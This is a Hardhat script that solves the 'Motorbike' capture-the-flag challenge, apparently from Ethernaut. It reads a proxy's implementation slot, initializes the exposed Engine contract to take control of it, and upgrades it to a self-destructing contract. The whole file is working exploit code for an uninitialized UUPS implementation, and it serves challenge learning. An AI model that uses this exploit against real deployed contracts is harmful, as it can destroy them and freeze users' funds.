import { Motorbike, Engine, MotorbikeSolution } from "../typechain";
import { task, types } from "hardhat/config";
import { HardhatRuntimeEnvironment, TaskArguments } from "hardhat/types";

task("solveMotorbike", "Solves the Double Entry Point challenge")
    .addParam("motorbikeAddress", "Address of the exploitable contract", undefined, types.string, false)
    .setAction(async (args: TaskArguments, hre: HardhatRuntimeEnvironment) => {
        if (!hre.ethers.utils.isAddress(args.motorbikeAddress)) {
            throw new Error(`Invalid contract address format: ${args.motorbikeAddress}`);
        }

        const motorbikeFactory = await hre.ethers.getContractFactory("Motorbike");
        const motorbike = (await motorbikeFactory.attach(args.motorbikeAddress)) as Motorbike;

        const storageSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
        const engineAddressUint256 = await hre.ethers.provider.getStorageAt(motorbike.address, storageSlot);

        const engineAddress = hre.ethers.utils.hexZeroPad(hre.ethers.utils.hexStripZeros(engineAddressUint256), 20);
        console.log(`Engine address: ${engineAddress}`);

        const engineFactory = await hre.ethers.getContractFactory("Engine");
        const engine = (await engineFactory.attach(engineAddress)) as Engine;

        const motorbikeProxy = (await engineFactory.attach(args.motorbikeAddress)) as Engine;
        const horsePower = await motorbikeProxy.horsePower();

        console.log(`Motorbike horse power: ${horsePower}`);

        // Deploy the new implementation
        const newEngineFactory = await hre.ethers.getContractFactory("MotorbikeSolution");
        const newEngine = (await newEngineFactory.deploy()) as MotorbikeSolution;

        // Take control of the engine
        await engine.initialize();

        // Set the new implementation
        const newEngineIface = newEngineFactory.interface;
        const calldata = newEngineIface.encodeFunctionData("initialize()", []);

        console.log("Calldata: ", calldata);

        await engine.upgradeToAndCall(newEngine.address, calldata);

        // Check that the engine has been destructed
        try {
            await motorbikeProxy.horsePower();
        } catch (e) {
            console.log("Motorbike has been disabled");
        }
    });
